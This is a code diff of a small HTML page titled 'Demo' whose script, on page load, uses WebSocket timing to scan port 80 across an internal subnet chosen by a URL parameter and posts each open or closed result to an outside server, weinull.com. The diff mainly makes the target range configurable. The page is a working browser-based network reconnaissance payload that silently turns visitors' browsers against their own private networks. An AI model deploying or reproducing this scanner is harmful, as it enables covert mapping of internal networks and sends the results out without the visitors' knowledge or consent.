@@ -3,33 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <title>Demo</title>
-    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap-combined.min.css">
-    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap-theme.min.css">
     <script type="application/javascript" src="/static/js/jquery-2.1.3.min.js"></script>
 </head>
 <body>
 
 <script type="application/javascript">
+
+    function GetQueryString(name)
+    {
+         var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+         var r = window.location.search.substr(1).match(reg);
+         if(r!=null)return  unescape(r[2]); return null;
+    }
+
     function port_scan(ip, port) {
         var ws = new WebSocket("ws://" + ip + ":" + port.toString());
         
         ws.onopen = function () {
-            $.post("https://weinull.com/whoami", {"result": ip + ":" + port.toString() + " - open - timeStamp: " + msg.timeStamp.toString()});
+            var postData = ip + ":" + port.toString() + " - Status: "
+            $.post("https://weinull.com/whoami", {"result": postData + "open"});
         };
         
         ws.onerror = function (msg) {
+            var postData = ip + ":" + port.toString() + " - timeStamp: " + msg.timeStamp.toString() + " - Status: "
             if (msg.timeStamp < 1000) {
-                $.post("https://weinull.com/whoami", {"result": ip + ":" + port.toString() + " - open - timeStamp: " + msg.timeStamp.toString()});
+                $.post("https://weinull.com/whoami", {"result": postData + "open"});
             } else {
-                $.post("https://weinull.com/whoami", {"result": ip + ":" + port.toString() + " - close - timeStamp: " + msg.timeStamp.toString()});
+                $.post("https://weinull.com/whoami", {"result": postData + "close"});
             }
         };
     }
     for (var i = 1; i < 256; i++) {
-        port_scan("10.22.10." + i.toString(), 80)
+        port_scan(GetQueryString("ip").toString() + i.toString(), 80)
     }
 </script>
 
-<script type="application/javascript" src="/static/js/bootstrap.min.js"></script>
 </body>
 </html>
